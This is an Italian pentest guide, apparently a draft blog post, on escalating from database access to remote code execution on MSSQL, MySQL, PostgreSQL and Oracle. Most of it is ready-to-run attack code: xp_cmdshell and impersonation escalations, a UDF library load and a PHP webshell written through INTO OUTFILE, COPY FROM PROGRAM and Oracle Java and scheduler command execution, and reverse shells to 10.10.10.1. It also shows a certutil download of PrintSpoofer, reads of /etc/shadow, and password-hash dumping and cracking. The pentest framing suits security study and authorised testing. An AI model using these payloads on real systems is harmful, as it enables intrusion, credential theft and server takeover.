---
title: 'Database Privilege Escalation: da Accesso DB a RCE'
slug: database-privilege-escalation
description: 'Guida alla database privilege escalation. Pentest per MSSQL, MySQL, PostgreSQL e Oracle: enumera i privilegi e passa dall’accesso al database alla RCE.'
image: /database-privilege-escalation-rce.webp
draft: true
date: 2026-08-06T00:00:00.000Z
categories:
  - guides-resources
subcategories:
  - tecniche
tags:
  - database-privilege-escalation
  - postgresql
  - mysql
  - mssql
  - oracle-database
  - database-pentesting
---

# Database Privilege Escalation: da Utente DB a RCE su MSSQL, MySQL, PostgreSQL e Oracle

Il **database privilege escalation** è il processo con cui, partendo da un accesso al database (ottenuto tramite SQL injection, credenziali trovate, accesso diretto alla porta), si scala a un livello di privilegio superiore — fino a eseguire comandi sul sistema operativo sottostante.

È uno dei path di escalation più comuni nei pentest su ambienti Windows e Linux: il database gira spesso come utente privilegiato (`SYSTEM`, `root`, `postgres`), ed esistono funzionalità native pensate per l'amministrazione che diventano armi offensive nelle mani di un attaccante.

Il percorso tipico è questo:

```
SQL Injection / credenziali trovate
        ↓
Accesso al DB come utente applicativo (bassa privilegio)
        ↓
Escalation a DBA / sysadmin / superuser nel DB
        ↓
Esecuzione comandi OS tramite funzionalità del DB
        ↓
RCE → shell → post-exploitation
```

Vedi anche: [sql-injection](https://hackita.it/articoli/sql-injection), [rce](https://hackita.it/articoli/rce), [database-security](https://hackita.it/articoli/database-security), [lateral-movement](https://hackita.it/articoli/lateral-movement), [credential-dumping](https://hackita.it/articoli/credential-dumping).

***

## Step 0 — Ricognizione: Cosa Puoi Fare Con l'Utente Attuale?

Prima di tentare escalation, enumera cosa hai già. Ogni database ha le sue query di ricognizione.

### MSSQL

```sql
-- Chi sono?
SELECT SYSTEM_USER;        -- login SQL Server
SELECT USER_NAME();        -- utente DB corrente
SELECT @@VERSION;          -- versione SQL Server

-- Sono sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');
-- 1 = sì → puoi abilitare xp_cmdshell direttamente
-- 0 = no → hai bisogno di escalation

-- Quali ruoli ho?
SELECT name FROM sys.server_role_members
JOIN sys.server_principals ON role_principal_id = principal_id
WHERE member_principal_id = SUSER_ID();

-- Quali privilegi ho?
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Linked server disponibili? (pivot verso altri DB)
SELECT name, data_source FROM sys.servers WHERE is_linked = 1;

-- xp_cmdshell già abilitato?
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
-- 1 = già attivo → esegui comandi subito
```

### MySQL

```sql
-- Chi sono?
SELECT USER();             -- utente corrente
SELECT @@version;          -- versione MySQL
SELECT @@hostname;         -- hostname server
SELECT @@datadir;          -- path dei file DB

-- Quali privilegi ho?
SHOW GRANTS FOR CURRENT_USER();
-- Cerca: FILE, SUPER, CREATE, EXECUTE

-- Ho il privilegio FILE? (lettura/scrittura file OS)
SELECT File_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1);

-- Posso scrivere nel filesystem?
SELECT @@secure_file_priv;
-- '' (vuoto) = posso scrivere ovunque → OUTFILE su qualsiasi path
-- /var/lib/mysql = solo in quella cartella
-- NULL = disabilitato

-- Esistono UDF installate?
SELECT * FROM mysql.func;
```

### PostgreSQL

```sql
-- Chi sono?
SELECT current_user;
SELECT version();

-- Sono superuser?
SELECT usesuper FROM pg_user WHERE usename = current_user;
-- t = true → superuser → COPY FROM PROGRAM disponibile

-- Quali ruoli ho?
SELECT rolname FROM pg_roles
JOIN pg_auth_members ON pg_roles.oid = pg_auth_members.roleid
WHERE member = (SELECT oid FROM pg_roles WHERE rolname = current_user);

-- Estensioni installate? (pg_read_file, adminpack, ecc.)
SELECT name, default_version FROM pg_available_extensions WHERE installed_version IS NOT NULL;

-- Posso eseguire COPY FROM PROGRAM?
SELECT has_function_privilege(current_user, 'pg_ls_dir(text)', 'execute');
```

### Oracle

```sql
-- Chi sono?
SELECT USER FROM DUAL;
SELECT * FROM V$VERSION;

-- Quali privilegi di sistema ho?
SELECT PRIVILEGE FROM SESSION_PRIVS;
-- Cerca: CREATE ANY PROCEDURE, EXECUTE ANY PROCEDURE, CREATE EXTERNAL JOB

-- Sono DBA?
SELECT COUNT(*) FROM SESSION_PRIVS WHERE PRIVILEGE = 'DBA';

-- Stored procedure vulnerabili a injection?
SELECT OWNER, OBJECT_NAME FROM ALL_PROCEDURES
WHERE AUTHID = 'CURRENT_USER';
```

***

## MSSQL: xp\_cmdshell → RCE come SYSTEM

`xp_cmdshell` è una stored procedure di SQL Server che esegue comandi di sistema operativo. È la strada più diretta da MSSQL a shell.

Di default è disabilitata. Per abilitarla serve il ruolo **sysadmin**.

### Caso 1 — Sei già sysadmin (o hai sa)

```sql
-- Step 1: abilita le opzioni avanzate
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Step 2: abilita xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Step 3: esegui comandi
EXEC xp_cmdshell 'whoami';
-- Output: nt authority\system  ← se SQL Server gira come SYSTEM → jackpot

EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'dir C:\Users';

-- Reverse shell con PowerShell encoded (bypassa caratteri speciali)
-- Prima genera il comando encoded:
-- powershell -e BASE64_ENCODED_COMMAND
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdA...';

-- Stealth: disabilita xp_cmdshell dopo l'uso
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

### Caso 2 — Sei db\_owner su un database TRUSTWORTHY

Se non sei sysadmin ma sei `db_owner` su un database con la proprietà `TRUSTWORTHY = ON`, puoi scalare a sysadmin tramite una stored procedure.

```sql
-- Verifica se il database è TRUSTWORTHY
SELECT name, is_trustworthy_on FROM sys.databases WHERE name = DB_NAME();
-- is_trustworthy_on = 1 → exploitabile

-- Crea una stored procedure che esegue con privilegi sysadmin
USE [database_trustworthy];
CREATE PROCEDURE escalate_privs
WITH EXECUTE AS OWNER
AS
BEGIN
  EXEC sp_addsrvrolemember 'tuo_utente', 'sysadmin';
END;

-- Esegui la procedure → ora sei sysadmin
EXEC escalate_privs;

-- Verifica
SELECT IS_SRVROLEMEMBER('sysadmin');
-- 1 → ora puoi abilitare xp_cmdshell
```

### Caso 3 — Impersonation (EXECUTE AS)

Alcuni utenti hanno il permesso di impersonare altri utenti più privilegiati.

```sql
-- Chi posso impersonare?
SELECT distinct b.name
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersona l'utente SA o sysadmin
EXECUTE AS LOGIN = 'sa';

-- Ora hai i privilegi di sa → abilita xp_cmdshell
SELECT IS_SRVROLEMEMBER('sysadmin');
-- 1 → procedi con xp_cmdshell
```

### Caso 4 — Linked Server Exploitation

Un linked server è una connessione configurata verso un altro SQL Server. Puoi eseguire query (e comandi) su quel server attraverso la connessione.

```sql
-- Elenca i linked server
SELECT name, data_source FROM sys.servers WHERE is_linked = 1;

-- Esegui query sul linked server
SELECT * FROM OPENQUERY([LinkedServer], 'SELECT SYSTEM_USER');

-- Se il linked server ha xp_cmdshell abilitato:
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer];

-- Double hop: da linked server a un terzo server
EXEC ('EXEC (''EXEC xp_cmdshell ''''whoami'''''') AT [Server3]') AT [Server2];
```

→ Vedi anche: [porta-1433-mssql](https://hackita.it/articoli/porta-1433-mssql)

***

## MySQL: UDF e INTO OUTFILE → RCE

MySQL non ha un equivalente diretto di xp\_cmdshell. Le due tecniche principali sono le **User Defined Functions (UDF)** e la scrittura di file tramite **INTO OUTFILE**.

### UDF Injection — RCE via Shared Library

Le UDF sono funzioni custom che MySQL carica da una shared library (`.so` su Linux, `.dll` su Windows). Se carichi una UDF che esegue comandi di sistema, hai RCE.

```sql
-- Step 1: trova il plugin directory
SHOW VARIABLES LIKE 'plugin_dir';
-- /usr/lib/mysql/plugin/

-- Step 2: verifica di poter scrivere file
SELECT @@secure_file_priv;
-- '' o NULL → puoi scrivere

-- Step 3: scrivi la shared library nel plugin directory
-- (la libreria è disponibile su sqlmap --os-shell o su exploit-db)
-- Metodo: converti la lib in hex e scrivila con INTO DUMPFILE

SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- Step 4: crea la funzione
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- Step 5: esegui comandi
SELECT sys_eval('whoami');
SELECT sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');

-- Cleanup
DROP FUNCTION sys_exec;
DROP FUNCTION sys_eval;
```

**Automatizzato con sqlmap:**

```bash
# sqlmap gestisce tutto il processo in automatico
sqlmap -u "https://target.com/search?id=1" \
  --dbms=mysql \
  --os-shell
# → sqlmap carica la UDF, crea le funzioni, e ti dà una shell interattiva
```

### INTO OUTFILE — Webshell via MySQL

Se conosci il path del webroot e hai il privilegio FILE, puoi scrivere una webshell direttamente dal database.

```sql
-- Scrivi una webshell PHP nel webroot
SELECT "<?php system($_GET['cmd']); ?>"
INTO OUTFILE '/var/www/html/shell.php';

-- Verifica
-- Visita: https://target.com/shell.php?cmd=id
-- Output: uid=33(www-data)

-- Condizioni necessarie:
-- 1. Privilegio FILE sull'utente MySQL
-- 2. secure_file_priv = '' (permette scrittura ovunque)
-- 3. Conosci il path del webroot
-- 4. L'utente MySQL ha permessi di scrittura sul webroot
```

### Lettura File di Sistema con LOAD\_FILE

```sql
-- Leggi file di sistema (richiede privilegio FILE)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');  -- solo se MySQL gira come root
SELECT LOAD_FILE('/var/www/html/config.php');  -- config dell'app → credenziali
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');  -- Windows
```

→ Vedi anche: [porta-3306-mysql](https://hackita.it/articoli/porta-3306-mysql)

***

## PostgreSQL: COPY FROM PROGRAM → RCE da Superuser

PostgreSQL ha una funzionalità potente: `COPY FROM PROGRAM` permette di eseguire un comando OS e inserire il suo output in una tabella. Disponibile solo per i superuser.

```sql
-- Verifica di essere superuser
SELECT usesuper FROM pg_user WHERE usename = current_user;
-- t → sei superuser → procedi

-- Metodo 1: COPY FROM PROGRAM (PostgreSQL 9.3+)
-- Crea una tabella temporanea per catturare l'output
CREATE TABLE cmd_output (output TEXT);

-- Esegui il comando
COPY cmd_output FROM PROGRAM 'id';

-- Leggi il risultato
SELECT * FROM cmd_output;
-- uid=26(postgres) gid=26(postgres) groups=26(postgres)

-- Reverse shell
COPY cmd_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"';

-- Cleanup
DROP TABLE cmd_output;
```

```sql
-- Metodo 2: pg_read_file (legge file di sistema)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/shadow');
SELECT pg_read_file('/var/lib/postgresql/.pgpass');  -- credenziali DB

-- Metodo 3: pg_ls_dir (lista directory)
SELECT pg_ls_dir('/etc');
SELECT pg_ls_dir('/home');
```

### Escalation da Utente Non-Superuser (CVE e Configurazioni Errate)

```sql
-- Se non sei superuser, cerca ruoli che puoi assumere
SELECT rolname FROM pg_roles WHERE rolcanlogin = false;

-- Cerca funzioni con SECURITY DEFINER (girano con i privilegi del owner)
SELECT proname, proowner::regrole, prosecdef
FROM pg_proc
WHERE prosecdef = true;
-- Se il owner è postgres (superuser) e la funzione è vulnerabile a SQL injection
-- → esegui la funzione con payload SQLi → scala a superuser
```

→ Vedi anche: [porta-5432-postgresql](https://hackita.it/articoli/porta-5432-postgresql)

***

## Oracle: Java Stored Procedure e DBMS\_SCHEDULER → RCE

Oracle è il più complesso ma ha vettori potenti, soprattutto tramite Java integrato.

### Java Stored Procedure

Oracle supporta stored procedure scritte in Java. Se hai il privilegio `CREATE PROCEDURE` e `EXECUTE` su `java.lang.Runtime`, puoi eseguire comandi OS.

```sql
-- Step 1: crea la funzione Java
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "RCE" AS
import java.lang.*;
import java.io.*;

public class RCE {
  public static String exec(String cmd) throws Exception {
    Runtime rt = Runtime.getRuntime();
    String[] commands = new String[]{"/bin/bash", "-c", cmd};
    Process proc = rt.exec(commands);
    BufferedReader stdInput = new BufferedReader(
      new InputStreamReader(proc.getInputStream()));
    String output = "";
    String line;
    while ((line = stdInput.readLine()) != null) {
      output += line + "\n";
    }
    return output;
  }
}
/

-- Step 2: crea una wrapper function PL/SQL
CREATE OR REPLACE FUNCTION java_exec(cmd VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'RCE.exec(java.lang.String) return java.lang.String';
/

-- Step 3: esegui
SELECT java_exec('id') FROM DUAL;
-- uid=1521(oracle) gid=1521(oracle)

SELECT java_exec('cat /etc/passwd') FROM DUAL;
```

### DBMS\_SCHEDULER (External Jobs)

Oracle Database Scheduler può eseguire job OS. Richiede `CREATE JOB` o `CREATE EXTERNAL JOB`.

```sql
-- Esegui un comando OS via scheduler
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'REVSHELL',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 3,
    enabled    => FALSE,
    auto_drop  => TRUE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('REVSHELL', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('REVSHELL', 2, 'bash');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('REVSHELL', 3,
    'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
  DBMS_SCHEDULER.ENABLE('REVSHELL');
END;
/
```

### SQL Injection in Stored Procedure con AUTHID CURRENT\_USER

```sql
-- Cerca stored procedure con SQL dinamica e AUTHID CURRENT_USER
-- che eseguono con i privilegi del chiamante (non del definer)
-- Se contengono SQL injection → esegue con privilegi del definer (SYS)

-- Pattern vulnerabile:
CREATE OR REPLACE PROCEDURE GET_RECORD (P_ID VARCHAR) 
AUTHID DEFINER AS
BEGIN
  EXECUTE IMMEDIATE 'SELECT * FROM records WHERE id = ''' || P_ID || '''';
  -- ↑ concatenazione diretta → SQL injection
  -- AUTHID DEFINER → gira con privilegi del creatore (spesso SYS)
END;
/

-- Payload injection nella procedure:
EXEC GET_RECORD('1'' UNION SELECT NULL FROM DUAL; GRANT DBA TO current_user;--');
```

***

## Tool Automatizzati

Non devi fare tutto a mano. Questi tool automatizzano le fasi principali.

```bash
# sqlmap — Swiss Army Knife per SQL injection + privilege escalation
# Testa automaticamente xp_cmdshell, UDF, INTO OUTFILE

# MSSQL OS shell
sqlmap -u "https://target.com/?id=1" --dbms=mssql --os-shell

# MySQL OS shell
sqlmap -u "https://target.com/?id=1" --dbms=mysql --os-shell

# PostgreSQL OS shell
sqlmap -u "https://target.com/?id=1" --dbms=postgresql --os-shell

# Dump credenziali DB
sqlmap -u "https://target.com/?id=1" --passwords

# impacket-mssqlclient (connessione diretta a MSSQL)
impacket-mssqlclient 'DOMAIN/user:password@IP'
impacket-mssqlclient 'sa:password@IP' -windows-auth

# Dentro mssqlclient:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "powershell -e BASE64CMD"

# crackmapexec — MSSQL enumeration e command execution
crackmapexec mssql IP -u sa -p password --local-auth
crackmapexec mssql IP -u sa -p password -x "whoami"

# PostgreSQL directo con psql
psql -h IP -U postgres -c "SELECT version();"
psql -h IP -U postgres -c "CREATE TABLE t(o TEXT); COPY t FROM PROGRAM 'id'; SELECT * FROM t;"
```

***

## Da Shell DB a Privilege Escalation OS

Hai la shell come utente del database. Ora scala al sistema operativo.

### MSSQL → SYSTEM via SeImpersonatePrivilege

Il service account di SQL Server ha spesso `SeImpersonatePrivilege`. Questo è sufficiente per scalare a SYSTEM con un Potato attack.

```powershell
# Verifica i privilegi del service account
xp_cmdshell "whoami /priv"
# SeImpersonatePrivilege → Enabled → usa un Potato

# Trasferisci JuicyPotato o PrintSpoofer sul server
xp_cmdshell "certutil -urlcache -f http://10.10.10.1/PrintSpoofer.exe C:\Temp\ps.exe"

# Esegui per scalare a SYSTEM
xp_cmdshell "C:\Temp\ps.exe -i -c cmd"
# → shell come NT AUTHORITY\SYSTEM
```

→ Vedi anche: [seimpersonateprivilege](https://hackita.it/articoli/seimpersonateprivilege), [privilege-escalation-windows](https://hackita.it/articoli/privilege-escalation-windows)

### MySQL/PostgreSQL → Root via Misconfiguration

```bash
# Controlla con quale utente gira il processo DB
ps aux | grep -E "mysql|postgres"
# Se gira come root → qualsiasi comando ha RCE come root

# sudo misconfiguration
sudo -l
# (ALL) NOPASSWD: /usr/bin/mysql → puoi eseguire mysql come root
sudo mysql -e '\! /bin/bash'
# → shell root

# SUID su binary del DB
find / -perm -4000 -name "*mysql*" -o -name "*psql*" 2>/dev/null
```

***

## Estrazione Credenziali dal Database

Prima ancora di scalare, il database contiene dati preziosi.

```sql
-- MSSQL: hash delle password degli utenti SQL
SELECT name, password_hash FROM sys.sql_logins;

-- MySQL: hash delle password utenti
SELECT user, authentication_string FROM mysql.user;

-- PostgreSQL: hash MD5 delle password
SELECT usename, passwd FROM pg_shadow;

-- Oracle: hash DES (versioni vecchie) o verifier moderni
SELECT username, password FROM dba_users;  -- richiede DBA
```

```bash
# Cracking degli hash con hashcat
# MSSQL (MSSQL-SHA512)
hashcat -m 1731 mssql_hashes.txt /usr/share/wordlists/rockyou.txt

# MySQL 4.1+ (mysql_native_password)
hashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt

# PostgreSQL MD5
hashcat -m 28 postgres_hashes.txt /usr/share/wordlists/rockyou.txt
```

***

## Checklist

```
RICOGNIZIONE
☐ Utente corrente identificato (SYSTEM_USER, USER(), current_user)
☐ Versione DB identificata (@@VERSION, version())
☐ Ruoli e privilegi enumerati
☐ MSSQL: IS_SRVROLEMEMBER('sysadmin') → 0 o 1?
☐ MySQL: secure_file_priv = '' → FILE privilege disponibile?
☐ PostgreSQL: usesuper = t → COPY FROM PROGRAM disponibile?

ESCALATION NEL DB
☐ MSSQL: xp_cmdshell già abilitato?
☐ MSSQL: sei db_owner su database TRUSTWORTHY?
☐ MSSQL: puoi impersonare login privilegiati?
☐ MSSQL: linked server disponibili con privilegi sysadmin?
☐ MySQL: puoi scrivere nel plugin directory? UDF possibile?
☐ MySQL: secure_file_priv = '' → INTO OUTFILE su webroot?
☐ PostgreSQL: superuser → COPY FROM PROGRAM?
☐ Oracle: CREATE PROCEDURE + Java exec disponibile?
☐ Oracle: DBMS_SCHEDULER external job disponibile?

ESCALATION A OS
☐ MSSQL: whoami /priv → SeImpersonatePrivilege? → Potato attack
☐ DB gira come root/SYSTEM → comandi già eseguiti come root
☐ sudo -l → binary DB eseguibile come root?
☐ Credenziali estratte dal DB → cracking → riuso

DOCUMENTAZIONE
☐ Screenshot: query di ricognizione + output ruoli
☐ Screenshot: comando OS eseguito + output (whoami, id)
☐ Screenshot: reverse shell ricevuta
☐ Path completo dell'escalation documentato
```

***

## FAQ

**Posso usare xp\_cmdshell senza essere sysadmin?**
No direttamente. Ma puoi arrivarci indirettamente tramite TRUSTWORTHY database, impersonation, o linked server. Se sei db\_owner su un database TRUSTWORTHY, puoi creare una stored procedure che gira con i privilegi del database owner (spesso sa) e aggiungerti al ruolo sysadmin.

**MySQL non ha xp\_cmdshell. Come eseguo comandi?**
Due vie: UDF (carica una shared library con funzione exec) oppure INTO OUTFILE su webroot per scrivere una webshell. La prima è più potente ma richiede accesso al plugin directory. La seconda richiede di conoscere il webroot path e che MySQL abbia i permessi di scrittura lì.

**COPY FROM PROGRAM su PostgreSQL richiede sempre superuser?**
Sì, è riservato ai superuser. Ma ci sono path alternativi: stored procedure con SECURITY DEFINER, CVE su estensioni installate, o misconfigurazioni nel pg\_hba.conf che permettono accesso senza password all'utente postgres.

**Come identifico il webroot path per INTO OUTFILE?**
Dal messaggio di errore dell'applicazione (stack trace), dal file di configurazione letto tramite LOAD\_FILE, dall'header `X-Powered-By` o dagli errori PHP/Apache, oppure bruteforza i path comuni: `/var/www/html/`, `/srv/http/`, `/usr/share/nginx/html/`.

**Qual è la severità in un report?**
RCE sul server tramite il database → **Critical**, sempre. Lettura file di sistema tramite LOAD\_FILE o pg\_read\_file → **High**. Escalation di ruolo interno al DB senza RCE OS → **High**.

***

## Risorse

* [HackTricks — MSSQL Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
* [HackTricks — MySQL Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
* [HackTricks — PostgreSQL Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
* [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
* [Advanced SQL Injection Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)

***

> Hai accesso al database come guest? Con la query giusta diventi SYSTEM.
